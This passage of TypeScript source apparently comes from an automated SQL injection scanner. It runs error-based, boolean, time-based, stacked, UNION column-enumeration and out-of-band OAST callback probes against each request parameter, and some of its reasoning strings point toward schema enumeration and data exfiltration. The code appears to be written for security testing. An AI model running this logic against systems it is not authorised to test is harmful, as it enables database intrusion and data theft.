      this.log('info', 'testing', `[Parameter ${testedCount}/${totalParams}] Testing parameter: "${param.name}" (${param.location}, Context: ${param.detectedContext}) [Engine Mode: ${this.engineMode}]`, undefined, undefined, param.name);

      const hypothesis = new HypothesisEngine(param, this.dbmsFingerprint.dbms);
      const initialBelief = hypothesis.getBeliefState();
      this.log('info', 'testing', `Bayesian Prior: Context="${initialBelief.mostLikelyContext}" (Entropy: ${initialBelief.contextEntropy.toFixed(2)}b), DBMS="${initialBelief.mostLikelyDbms}", VulnProb=${(initialBelief.vulnerabilityProbability * 100).toFixed(0)}%`, undefined, undefined, param.name);

      const surfNode = this.currentInvestigationNodes.find((n) => n.id === `node-surf-${param.id}`);
      if (surfNode) {
        surfNode.status = 'running';
        this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
      }
      this.emitHypothesisTelemetry(hypothesis, param);

      this.onAiReasoning?.({
        id: `ai-param-${param.id}-${Date.now()}`,
        timestamp: Date.now(),
        hypothesis: `Probing Parameter "${param.name}" (${param.location}) in Context [${param.detectedContext || 'single_quote_string'}]`,
        reasoning: `Initial Bayesian prior: Context entropy=${initialBelief.contextEntropy.toFixed(2)}b. Formulating error, boolean truth, and timing invariants.`,
        suggestedAction: 'Execute sequential injection probe suite.',
        confidenceScore: 0.4,
      });

      let paramIsVulnerable = false;
      const paramEvidenceList: SqlScanEvidence[] = [];

      // 0. Shannon-Optimal Multiplexed Probing (Zero-Shot Search Space Collapse)
      if (!this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        const polyglotProbes = MultiplexedProbeEngine.getInitialMultiplexedProbes();
        for (const poly of polyglotProbes) {
          if (this.isAborted) break;
          const res = await this.executeProbe(parsed, param, poly.payload, true);
          const errorMatch = ErrorTester.analyzeResponse(res.body);
          if (errorMatch) {
            this.log('info', 'testing', `Multiplexed probe [${poly.id}] collapsed search space: ${errorMatch.patternName} (${errorMatch.dbms})`);
            if (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL') {
              this.dbmsFingerprint = {
                dbms: errorMatch.dbms,
                confidence: 'High',
                confidenceScore: 92,
                evidence: [`Multiplexed probe matched signature: ${errorMatch.patternName}`],
              };
            }
          }
        }

        // 0B. God Rail v3 Single-Probe Polyglot Dialect Resolution
        if (this.engineMode === 'god_rail_v3' && (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL')) {
          try {
            const polyFingerprinter = new PolyglotFingerprinter(
              new GhostNetwork({ enabled: false }),
              new AdaptiveResponseOracle()
            );
            const headerMap: Record<string, string> = {};
            for (const h of parsed.headers) {
              if (h.enabled) headerMap[h.name] = h.value;
            }
            const strategyCtx = {
              baseRequest: {
                url: parsed.url,
                method: parsed.method,
                headers: headerMap,
                body: parsed.body,
              },
              parameterName: param.name,
              originalValue: param.originalValue,
            };
            const polyResult = await polyFingerprinter.resolveDialect(strategyCtx);
            if (polyResult.detectedDbms !== 'Generic SQL') {
              this.dbmsFingerprint = {
                dbms: polyResult.detectedDbms,
                confidence: polyResult.confidence,
                confidenceScore: 94,
                evidence: [polyResult.evidence],
              };
              this.log('success', 'testing', `[God Rail v3 Polyglot] Discovered Backend Engine: ${polyResult.detectedDbms} (${polyResult.evidence})`);
            }
          } catch {
            // Non-blocking fallback
          }
        }
      }

      // A. Error-Based Testing
      if (this.target.testedInjectionTypes.errorBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('error_testing', `Error-based probing: ${param.name}`, basePercent - 4, param.name, totalParams, testedCount);
        const errorProbes = this.safetyConfig.scanMode === 'quick'
          ? ErrorTester.getPrecisionErrorProbes().slice(0, 3)
          : ErrorTester.getPrecisionErrorProbes();

        for (const probe of errorProbes) {
          if (this.isAborted) break;
          let res = await this.executeProbe(parsed, param, probe.payload, true);
          let errorMatch = ErrorTester.analyzeResponse(res.body);
          // If probe did not match in append mode and contains casting/conversion keywords,
          // also try in replacement mode (append=false) to avoid backend buffer/length truncation
          if (!errorMatch && (probe.payload.includes('CAST(') || probe.payload.includes('CONVERT(') || probe.payload.includes('EXTRACTVALUE(') || probe.payload.includes('CTXSYS.'))) {
            const replRes = await this.executeProbe(parsed, param, probe.payload, false);
            const replMatch = ErrorTester.analyzeResponse(replRes.body);
            if (replMatch) {
              res = replRes;
              errorMatch = replMatch;
            }
          }

          if (errorMatch) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, probe.payload, (r) => !!ErrorTester.analyzeResponse(r.body));

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              this.dbmsFingerprint = {
                dbms: errorMatch.dbms,
                confidence: 'High',
                confidenceScore: 90,
                evidence: [`Matched error signature: "${errorMatch.patternName}" (${errorMatch.matchedText})`],
              };

              hypothesis.updateWithObservation({
                oracleType: 'error_based',
                isPositive: true,
                confidence: 0.92,
                indicatedDbms: errorMatch.dbms,
                indicatedContext: param.detectedContext,
                evidence: errorMatch.matchedText,
              });
              this.emitHypothesisTelemetry(hypothesis, param);

              const errNode = this.currentInvestigationNodes.find((n) => n.id === 'node-exp-error');
              if (errNode) {
                errNode.status = 'supported';
                errNode.evidenceCount++;
                this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
              }

              this.onAiReasoning?.({
                id: `ai-err-${Date.now()}`,
                timestamp: Date.now(),
                hypothesis: `Error Oracle Triggered in "${param.name}": ${errorMatch.patternName}`,
                reasoning: `Observed error signature "${errorMatch.matchedText}" confirms dynamic string interpolation inside ${errorMatch.dbms} SQL execution context.${errorMatch.leakedData ? ` Leaked data: "${errorMatch.leakedData}".` : ''}`,
                suggestedAction: 'Confirm with non-destructive counterfactual error suppression.',
                confidenceScore: 0.92,
              });

              const ev: SqlScanEvidence = {
                id: `ev_err_${Date.now()}`,
                title: `Error-based SQLi: ${errorMatch.patternName}`,
                timestamp: Date.now(),
                injectionType: 'Error-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: probe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: res.status,
                testLength: res.body.length,
                testDurationMs: res.durationMs,
                rawRequest: res.rawRequest,
                rawResponse: res.rawResponse,
                matchedPattern: errorMatch.matchedText,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: errorMatch.leakedData
                  ? `Direct database error identified: ${errorMatch.patternName} (${errorMatch.dbms}) — Leaked value: "${errorMatch.leakedData}" [Reproduced ${repro.successRate}]`
                  : `Direct database error identified: ${errorMatch.patternName} (${errorMatch.dbms}) [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Error-based SQLi', param.detectedContext || 'string', probe.payload, 'positive', res.durationMs, errorMatch.matchedText, res.rawRequest, res.rawResponse);
              this.updateCoverage('error_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('error_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'error_testing',
                `SQL error detected in "${param.name}": ${errorMatch.patternName} (${errorMatch.dbms})${errorMatch.leakedData ? ` [Leaked: "${errorMatch.leakedData}"]` : ''} [Confirmed ${repro.successRate}]`,
                errorMatch.matchedText,
                probe.payload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Error-based SQLi', param.detectedContext || 'string', probe.payload, 'negative', res.durationMs, undefined, res.rawRequest, res.rawResponse);
          }
        }
      }

      // B. Boolean Differential Testing
      if (this.target.testedInjectionTypes.booleanBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('boolean_testing', `Boolean differential testing: ${param.name}`, basePercent - 2, param.name, totalParams, testedCount);
        const booleanPairs = this.safetyConfig.scanMode === 'quick'
          ? BooleanTester.getTestPairs(param).slice(0, 5)
          : BooleanTester.getTestPairs(param);

        for (const pair of booleanPairs) {
          if (this.isAborted) break;
          const trueRes = await this.executeProbe(parsed, param, pair.truePayload, true);
          const falseRes = await this.executeProbe(parsed, param, pair.falsePayload, true);

          const boolResult = BooleanTester.evaluateDifferential(
            baselineBody,
            baselineStatus,
            trueRes.body,
            trueRes.status,
            falseRes.body,
            falseRes.status,
            pair.truePayload,
            pair.falsePayload
          );

          if (boolResult.isVulnerable) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, pair.truePayload, (r) => {
              const sim = BooleanTester.evaluateDifferential(
                baselineBody,
                baselineStatus,
                r.body,
                r.status,
                falseRes.body,
                falseRes.status,
                pair.truePayload,
                pair.falsePayload
              );
              return sim.isVulnerable;
            });

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              confirmedTrueMarker = boolResult.uniqueMarker || '';
              if (boolResult.isConditionalError || boolResult.divergenceType === 'status_divergence') {
                confirmedConditionalError = true;
                confirmedConditionalPolarity = boolResult.divergencePolarity || 'error_on_true';
                this.log('info', 'testing', `Conditional error blind SQLi confirmed (${confirmedConditionalPolarity}) on "${param.name}".`);
              }
              if (pair.truePayload.includes("||(SELECT") || pair.truePayload.startsWith("'||")) {
                confirmedQuoteStyle = 'concatenation';
              }

              if (this.engineMode === 'ucmax_causal' || this.engineMode === 'autonomous_trigraph') {
                this.log('info', 'testing', `Initiating UCMA-X 5-Step Counterfactual Causal Verification on "${param.name}"...`);
                await CausalVerifier.verifyCausality(
                  param,
                  async (p, app) => this.executeProbe(parsed, param, p, app),
                  pair.truePayload,
                  pair.falsePayload,
                  (evt) => {
                    this.log(evt.state === 'passed' ? 'success' : evt.state === 'failed' ? 'warn' : 'info', 'testing', `[Causal Step ${evt.stepIndex}/5: ${evt.stepName}] ${evt.description}`);
                  }
                );

                this.log('info', 'testing', `Evaluating 3-Way Ternary Logic Metamorphic Partition (TLP) on "${param.name}"...`);
                const tlpResult = await TernaryMetamorphicVerifier.verifyTernaryPartition(
                  async (p, app) => this.executeProbe(parsed, param, p, app)
                );
                if (tlpResult.isProven) {
                  this.log('success', 'testing', `[Ternary TLP Invariant] ${tlpResult.reason}`);
                }
              }

              if (pair.dbms && pair.dbms !== 'Generic SQL' && (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL')) {
                this.dbmsFingerprint = {
                  dbms: pair.dbms,
                  confidence: 'High',
                  confidenceScore: 90,
                  evidence: [`${pair.dbms} specific boolean condition evaluated TRUE`],
                };
              }

              hypothesis.updateWithObservation({
                oracleType: 'boolean_based',
                isPositive: true,
                confidence: 0.95,
                indicatedContext: param.detectedContext,
                indicatedDbms: pair.dbms && pair.dbms !== 'Generic SQL' ? pair.dbms : undefined,
                evidence: 'Differential boolean truth divergence confirmed',
              });
              this.emitHypothesisTelemetry(hypothesis, param);

              const boolNode = this.currentInvestigationNodes.find((n) => n.id === 'node-exp-bool');
              if (boolNode) {
                boolNode.status = 'supported';
                boolNode.evidenceCount++;
                this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
              }

              this.onAiReasoning?.({
                id: `ai-bool-${Date.now()}`,
                timestamp: Date.now(),
                hypothesis: `Differential Boolean Truth Divergence in "${param.name}"`,
                reasoning: `Observable truth-state divergence confirmed between TRUE and FALSE invariant probes. Parameter is interpolated into SQL execution AST.`,
                suggestedAction: 'Execute multi-sample invariant verification across random noise tokens.',
                confidenceScore: 0.95,
              });

              const ev: SqlScanEvidence = {
                id: `ev_bool_${Date.now()}`,
                title: `Boolean-based differential: ${pair.name}`,
                timestamp: Date.now(),
                injectionType: 'Boolean-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: `TRUE: ${pair.truePayload} | FALSE: ${pair.falsePayload}`,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: trueRes.status,
                testLength: trueRes.body.length,
                testDurationMs: trueRes.durationMs,
                rawRequest: trueRes.rawRequest,
                rawResponse: trueRes.rawResponse,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: `${boolResult.evidence} [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Boolean-based SQLi', param.detectedContext || 'string', pair.truePayload, 'positive', trueRes.durationMs, boolResult.evidence, trueRes.rawRequest, trueRes.rawResponse);
              this.updateCoverage('boolean_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('boolean_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'boolean_testing',
                `Boolean differential confirmed on "${param.name}": TRUE matches baseline, FALSE diverges [Confirmed ${repro.successRate}]`,
                undefined,
                pair.truePayload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Boolean-based SQLi', param.detectedContext || 'string', pair.truePayload, 'negative', trueRes.durationMs, undefined, trueRes.rawRequest, trueRes.rawResponse);
          }
        }
      }

      // C. Time-Based Blind Testing
      if (this.target.testedInjectionTypes.timeBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('time_testing', `Time-based blind delay verification: ${param.name}`, basePercent, param.name, totalParams, testedCount);
        const delayProbes = TimeBasedTester.getDelayPayloads(param, 3);

        for (const probe of delayProbes) {
          if (this.isAborted) break;
          const timeRes = await this.executeProbe(parsed, param, probe.payload, true);
          const timeResult = TimeBasedTester.evaluateTiming(
            baselineDurations,
            timeRes.durationMs,
            probe.delaySeconds,
            probe.dbms
          );

          if (timeResult.isVulnerable) {
            // Hard-gated reproduction
            const repro = await this.verifyReproduction(parsed, param, probe.payload, (r) => {
              const tRes = TimeBasedTester.evaluateTiming(baselineDurations, r.durationMs, probe.delaySeconds, probe.dbms);
              return tRes.isVulnerable;
            });

            if (repro.success) {
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              if (this.dbmsFingerprint.dbms === 'Unknown') {
                this.dbmsFingerprint = {
                  dbms: probe.dbms,
                  confidence: 'High',
                  confidenceScore: 85,
                  evidence: [`Time delay execution verified with ${probe.dbms} specific sleep call (${probe.payload})`],
                };
              }

              hypothesis.updateWithObservation({
                oracleType: 'time_based',
                isPositive: true,
                confidence: 0.98,
                indicatedDbms: probe.dbms,
                indicatedContext: param.detectedContext,
                evidence: `Time delay execution verified with ${probe.dbms} specific sleep call`,
              });
              this.emitHypothesisTelemetry(hypothesis, param);

              const timeNode = this.currentInvestigationNodes.find((n) => n.id === 'node-exp-sprt');
              if (timeNode) {
                timeNode.status = 'supported';
                timeNode.evidenceCount++;
                this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
              }

              this.onAiReasoning?.({
                id: `ai-time-${Date.now()}`,
                timestamp: Date.now(),
                hypothesis: `Wald SPRT Sequential Latency Confirmed in "${param.name}"`,
                reasoning: `Observed latency ${timeRes.durationMs}ms tracks ${probe.delaySeconds}s delay primitive for ${probe.dbms}. Null hypothesis H0 rejected.`,
                suggestedAction: 'Isolate timing execution lane to avoid network variance.',
                confidenceScore: 0.98,
              });

              const ev: SqlScanEvidence = {
                id: `ev_time_${Date.now()}`,
                title: `Time-based SQLi: ${probe.dbms} (${probe.delaySeconds}s delay)`,
                timestamp: Date.now(),
                injectionType: 'Time-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: probe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: timeRes.status,
                testLength: timeRes.body.length,
                testDurationMs: timeRes.durationMs,
                rawRequest: timeRes.rawRequest,
                rawResponse: timeRes.rawResponse,
                reproductionCount: 3,
                reproductionSuccessRate: repro.successRate,
                analysisSummary: `${timeResult.evidence} [Reproduced ${repro.successRate}]`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'Time-Based Blind SQLi', param.detectedContext || 'string', probe.payload, 'positive', timeRes.durationMs, timeResult.evidence, timeRes.rawRequest, timeRes.rawResponse);
              this.updateCoverage('time_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('time_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'time_testing',
                `Time-based SQL delay confirmed on "${param.name}" using ${probe.dbms} sleep [Confirmed ${repro.successRate}]`,
                undefined,
                probe.payload,
                param.name
              );
              break;
            }
          } else {
            this.logExecution(param.name, 'Time-Based Blind SQLi', param.detectedContext || 'string', probe.payload, 'negative', timeRes.durationMs, undefined, timeRes.rawRequest, timeRes.rawResponse);
          }
        }
      }

      // D. Stacked Queries Testing
      if (this.target.testedInjectionTypes.stackedBased && !this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('stacked_testing', `Stacked multi-query testing: ${param.name}`, basePercent + 2, param.name, totalParams, testedCount);
        const stackedProbes = StackedTester.getStackedProbes(param, 3);

        for (const sp of stackedProbes) {
          if (this.isAborted) break;
          const sRes = await this.executeProbe(parsed, param, sp.payload, true);
          const stkResult = StackedTester.evaluateStackedResult(baselineDurations, sRes.durationMs, sp);

          if (stkResult.isVulnerable) {
            paramIsVulnerable = true;
            confirmedInjectableParam = param;

            const ev: SqlScanEvidence = {
              id: `ev_stacked_${Date.now()}`,
              title: `Stacked Query SQLi: Semicolon multi-statement execution (${sp.dbms})`,
              timestamp: Date.now(),
              injectionType: 'Stacked-query indicator',
              parameterName: param.name,
              parameterLocation: param.location,
              payload: sp.payload,
              baselineStatus,
              baselineLength: baselineBody.length,
              baselineDurationMs: timingStats.median,
              testStatus: sRes.status,
              testLength: sRes.body.length,
              testDurationMs: sRes.durationMs,
              rawRequest: sRes.rawRequest,
              rawResponse: sRes.rawResponse,
              reproductionCount: 1,
              analysisSummary: stkResult.evidence,
            };
            paramEvidenceList.push(ev);

            this.logExecution(param.name, 'Stacked Query SQLi', param.detectedContext || 'string', sp.payload, 'positive', sRes.durationMs, stkResult.evidence, sRes.rawRequest, sRes.rawResponse);
            this.updateCoverage('stacked_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('stacked_sqli')?.testedCount || 0) + 1, positiveCount: 1 });
            this.log('success', 'stacked_testing', `Stacked multi-query execution confirmed on "${param.name}": ${stkResult.evidence}`);
            break;
          } else {
            this.logExecution(param.name, 'Stacked Query SQLi', param.detectedContext || 'string', sp.payload, 'negative', sRes.durationMs, undefined, sRes.rawRequest, sRes.rawResponse);
          }
        }
      }

      // E. Adaptive ORDER BY & NULL-based UNION Canary Injection
      // ALWAYS attempt UNION detection — it enables information_schema extraction which is far more powerful than blind probing
      if (this.target.testedInjectionTypes.unionBased && !this.isAborted) {
        this.updateProgress('union_testing', `UNION & Column Detection: ${param.name}`, basePercent + 4, param.name, totalParams, testedCount);
        let determinedColumns = 0;

        // Step 1: ORDER BY Column Count Probing
        const orderProbes = UnionTester.getOrderByProbes(param, 12);
        let hadDivergence = false;
        for (let i = 0; i < orderProbes.length; i++) {
          if (this.isAborted) break;
          const p = orderProbes[i];
          const ordRes = await this.executeProbe(parsed, param, p.payload, true);
          const isMarkerMissing = confirmedTrueMarker && !ordRes.body.toLowerCase().includes(confirmedTrueMarker.toLowerCase());
          const isLengthDiverged = Math.abs(ordRes.body.length - baselineBody.length) >= 60;
          const isStatusDiverged = ordRes.status !== baselineStatus;

          if (!isStatusDiverged && !isLengthDiverged && !isMarkerMissing) {
            determinedColumns = p.columnCount;
            this.logExecution(param.name, 'ORDER BY Column Probe', param.detectedContext || 'string', p.payload, 'passed', ordRes.durationMs, `Column count >= ${p.columnCount}`, ordRes.rawRequest, ordRes.rawResponse);
          } else {
            hadDivergence = true;
            this.logExecution(param.name, 'ORDER BY Column Probe', param.detectedContext || 'string', p.payload, 'negative', ordRes.durationMs, `Column index ${p.columnCount} out of bounds`, ordRes.rawRequest, ordRes.rawResponse);
            break;
          }
        }
        // If all 12 probes succeeded without any divergence, parameter is not injected
        if (!hadDivergence && determinedColumns === 12) {
          determinedColumns = 0;
        }

        // Step 2: NULL-Based UNION Probing Fallback
        if (determinedColumns === 0) {
          const nullProbes = UnionTester.getNullUnionProbes(param, 10);
          for (const np of nullProbes) {
            if (this.isAborted) break;
            const nRes = await this.executeProbe(parsed, param, np.payload, true);
            if (nRes.status === baselineStatus && Math.abs(nRes.body.length - baselineBody.length) < 150) {
              determinedColumns = np.columnCount;
              if (np.dbms === 'Oracle') {
                this.dbmsFingerprint = {
                  dbms: 'Oracle',
                  confidence: 'High',
                  confidenceScore: 90,
                  evidence: ['Successful UNION SELECT NULL FROM DUAL response'],
                };
              }
              this.logExecution(param.name, 'NULL UNION Column Probe', param.detectedContext || 'string', np.payload, 'passed', nRes.durationMs, `Confirmed ${np.columnCount} columns (${np.dbms})`, nRes.rawRequest, nRes.rawResponse);
              break;
            } else {
              this.logExecution(param.name, 'NULL UNION Column Probe', param.detectedContext || 'string', np.payload, 'negative', nRes.durationMs, undefined, nRes.rawRequest, nRes.rawResponse);
            }
          }
        }

        if (determinedColumns >= 1) {
          let canaryReflected = false;
          this.updateCoverage('order_by', { status: 'passed', testedCount: determinedColumns, positiveCount: determinedColumns, reason: `${determinedColumns} columns verified` });
          this.log('info', 'union_testing', `Estimated query column count for "${param.name}": ${determinedColumns} column(s)`);

          // Step 3: Per-Column String Compatibility Canary Probing
          const perColProbes = UnionTester.getPerColumnCanaryProbes(param, determinedColumns);
          for (const cProbe of perColProbes) {
            if (this.isAborted) break;
            const uRes = await this.executeProbe(parsed, param, cProbe.payload, true);
            if (uRes.body.includes(cProbe.canaryMarker)) {
              canaryReflected = true;
              paramIsVulnerable = true;
              confirmedInjectableParam = param;
              confirmedRenderColumn = cProbe.targetColumnIndex;
              confirmedColumnCount = determinedColumns;

              if (cProbe.dbms && (this.dbmsFingerprint.dbms === 'Unknown' || this.dbmsFingerprint.dbms === 'Generic SQL')) {
                this.dbmsFingerprint = {
                  dbms: cProbe.dbms,
                  confidence: 'High',
                  confidenceScore: 95,
                  evidence: [`Canary reflection confirmed via ${cProbe.dbms} UNION syntax`],
                };
              }

              hypothesis.updateWithObservation({
                oracleType: 'union_based',
                isPositive: true,
                confidence: 0.99,
                indicatedDbms: cProbe.dbms && cProbe.dbms !== 'Generic SQL' ? cProbe.dbms : undefined,
                indicatedContext: param.detectedContext,
                evidence: `Canary reflection confirmed at column ${cProbe.targetColumnIndex} of ${determinedColumns}`,
              });
              this.emitHypothesisTelemetry(hypothesis, param);

              const unionNode = this.currentInvestigationNodes.find((n) => n.id === 'node-exp-union');
              if (unionNode) {
                unionNode.status = 'supported';
                unionNode.evidenceCount++;
                this.onInvestigationNodes?.([...this.currentInvestigationNodes], [...this.currentInvestigationEdges]);
              }

              this.onAiReasoning?.({
                id: `ai-union-${Date.now()}`,
                timestamp: Date.now(),
                hypothesis: `In-Band UNION Projection Confirmed (${determinedColumns} columns)`,
                reasoning: `Canary reflection confirmed in output stream at column index ${cProbe.targetColumnIndex}. In-band data exfiltration channel established.`,
                suggestedAction: 'Proceed to database schema and table enumeration.',
                confidenceScore: 0.99,
              });

              const ev: SqlScanEvidence = {
                id: `ev_union_${Date.now()}`,
                title: `UNION SQLi: Canary reflection at column ${cProbe.targetColumnIndex}`,
                timestamp: Date.now(),
                injectionType: 'UNION-based',
                parameterName: param.name,
                parameterLocation: param.location,
                payload: cProbe.payload,
                baselineStatus,
                baselineLength: baselineBody.length,
                baselineDurationMs: timingStats.median,
                testStatus: uRes.status,
                testLength: uRes.body.length,
                testDurationMs: uRes.durationMs,
                rawRequest: uRes.rawRequest,
                rawResponse: uRes.rawResponse,
                matchedPattern: cProbe.canaryMarker,
                reproductionCount: 1,
                analysisSummary: `Harmless canary marker "${cProbe.canaryMarker}" successfully reflected at column index ${cProbe.targetColumnIndex}`,
              };
              paramEvidenceList.push(ev);

              this.logExecution(param.name, 'UNION-Based SQLi', param.detectedContext || 'string', cProbe.payload, 'positive', uRes.durationMs, `Canary ${cProbe.canaryMarker} rendered at column ${cProbe.targetColumnIndex}`, uRes.rawRequest, uRes.rawResponse);
              this.updateCoverage('union_sqli', { status: 'vulnerable', testedCount: (this.coverageMap.get('union_sqli')?.testedCount || 0) + 1, positiveCount: 1 });

              this.log(
                'success',
                'union_testing',
                `UNION SQL Injection confirmed on "${param.name}": Canary [${cProbe.canaryMarker}] rendered at column ${confirmedRenderColumn}.`,
                undefined,
                cProbe.payload,
                param.name
              );
              break;
            } else {
              this.logExecution(param.name, 'UNION-Based SQLi', param.detectedContext || 'string', cProbe.payload, 'negative', uRes.durationMs, undefined, uRes.rawRequest, uRes.rawResponse);
            }
          }

          if (!canaryReflected) {
            // No canary reflected — UNION cannot be used for data extraction
            confirmedColumnCount = 0;
            confirmedRenderColumn = 0;
          }
        }
      }

      // E. Extended Attack & Audit Modules (NoSQL, Graph, ORM, Dynamic Identifier, Cloud SSRF)
      if (!this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep') && this.engineMode === 'god_rail_v3') {
        try {
          const headerMap: Record<string, string> = {};
          for (const h of parsed.headers) {
            if (h.enabled) headerMap[h.name] = h.value;
          }
          const strategyCtx = {
            baseRequest: {
              url: parsed.url,
              method: parsed.method,
              headers: headerMap,
              body: parsed.body,
            },
            parameterName: param.name,
            originalValue: param.originalValue,
          };
          const modRes = await ModuleRegistry.executeAll(
            strategyCtx,
            new GhostNetwork({ enabled: false }),
            new AdaptiveResponseOracle(),
            {
              type: this.dbmsFingerprint.dbms as any,
              version: this.dbmsFingerprint.version || null,
              confidence: this.dbmsFingerprint.confidence,
              confidenceScore: this.dbmsFingerprint.confidenceScore,
              evidence: [],
            }
          );
          if (modRes.findings.length > 0) {
            for (const f of modRes.findings) {
              this.log('warn', 'testing', `[Extended Module Finding] ${f.vulnerabilityType} detected on ${param.name}`);
            }
          }
        } catch {
          // Non-blocking fallback
        }
      }

      // F. Out-of-Band (OAST) Blind Testing
      // Critical for asynchronous blind SQL injection where responses produce zero observable differential
      if (!this.isAborted && (!paramIsVulnerable || this.safetyConfig.scanMode === 'deep')) {
        this.updateProgress('oob_testing', `Out-of-Band (OAST) Callback Probing: ${param.name}`, basePercent + 5, param.name, totalParams, testedCount);

        try {
          const oastClient = InteractshClient.getInstance();
          if (!oastClient.getSession()) {
            await oastClient.initialize(this.target.oobConfig?.providerUrl, this.target.oobConfig?.domain);
          }
          const session = oastClient.getSession();
          const oobDomain = this.target.oobConfig?.domain || session?.domain || 'oast.sentinel.local';
          this.log('info', 'oob_testing', `Active OAST Collaborator domain: ${oobDomain} (${this.target.oobConfig?.domain ? 'Target/UI Configured' : (session?.isOffline ? 'Internal Local' : 'Live Public OAST')})`);

          const { token, fqdn } = OobManager.generateToken(param, parsed.url, this.dbmsFingerprint.dbms, oobDomain);
          oastClient.registerToken(token, param.name, this.dbmsFingerprint.dbms, 'dns', fqdn);

          const oobProbes = OobManager.getOobPayloads(param, fqdn);

          for (const op of oobProbes) {
            if (this.isAborted) break;
            const oRes = await this.executeProbe(parsed, param, op.payload, true);
            this.logExecution(param.name, `OAST Probe (${op.dbms} ${op.channel})`, param.detectedContext || 'string', op.payload, 'passed', oRes.durationMs, op.description, oRes.rawRequest, oRes.rawResponse);
          }

          // Poll for interactions - allow sufficient time for asynchronous workers on live targets
          const isOffline = oastClient.getSession()?.isOffline ?? true;
          const pollWait = isOffline ? 200 : 3500;
          let interactions = await oastClient.pollInteractions(pollWait);
          if (interactions.length === 0 && !isOffline) {
            await new Promise((r) => setTimeout(r, 2000));
            interactions = await oastClient.pollInteractions(1000);
          }
          const hasCallback = oastClient.hasInteractionForParam(interactions, param.name) ||
            interactions.some((i) => i.correlationToken === token || i.fullId.includes(token));

          if (hasCallback) {
            const matchedInteraction = interactions.find((i) => i.correlationToken === token || i.fullId.includes(token)) || interactions[0];
            const confirmedDbms = (oastClient.getConfirmedDbms(matchedInteraction) as DbmsType) || (matchedInteraction ? 'Oracle' : this.dbmsFingerprint.dbms);

            paramIsVulnerable = true;
            confirmedInjectableParam = param;
            if (confirmedDbms && confirmedDbms !== 'Unknown') {
              this.dbmsFingerprint = {
                dbms: confirmedDbms,
                confidence: 'Confirmed',
                confidenceScore: 99,
                evidence: [`Out-of-band ${matchedInteraction.protocol.toUpperCase()} interaction triggered by ${confirmedDbms} callback`],
              };
            }

            const ev: SqlScanEvidence = {
              id: `ev_oob_${Date.now()}`,
              title: `Out-of-Band (OAST) SQLi: ${confirmedDbms} ${matchedInteraction.protocol.toUpperCase()} Callback Confirmed`,
              timestamp: Date.now(),
              injectionType: 'Out-of-Band (OAST)',
              parameterName: param.name,
              parameterLocation: param.location,
              payload: oobProbes[0]?.payload || `OAST callback to ${fqdn}`,
              baselineStatus,
              baselineLength: baselineBody.length,
              baselineDurationMs: timingStats.median,
              testStatus: baselineStatus,
              testLength: baselineBody.length,
              testDurationMs: timingStats.median,
              rawRequest: '',
              rawResponse: '',
              reproductionCount: 1,
              analysisSummary: `Asynchronous Out-of-Band ${matchedInteraction.protocol.toUpperCase()} interaction received from target backend for token ${token} (${matchedInteraction.fullId}). Confirms blind SQL code execution.`,
            };
            paramEvidenceList.push(ev);

            this.logExecution(param.name, 'Out-of-Band (OAST) SQLi', param.detectedContext || 'string', ev.payload, 'positive', 0, ev.analysisSummary);
            this.updateCoverage('oob_sqli', { status: 'vulnerable', testedCount: oobProbes.length, positiveCount: 1, reason: `OAST ${matchedInteraction.protocol.toUpperCase()} callback confirmed` });
            this.log('success', 'oob_testing', `Out-of-Band (OAST) SQL Injection confirmed on "${param.name}": Backend triggered ${matchedInteraction.protocol.toUpperCase()} callback to ${fqdn}`);
          } else {
            this.updateCoverage('oob_sqli', { status: 'passed', testedCount: oobProbes.length, positiveCount: 0, reason: 'No OAST callbacks received' });
          }
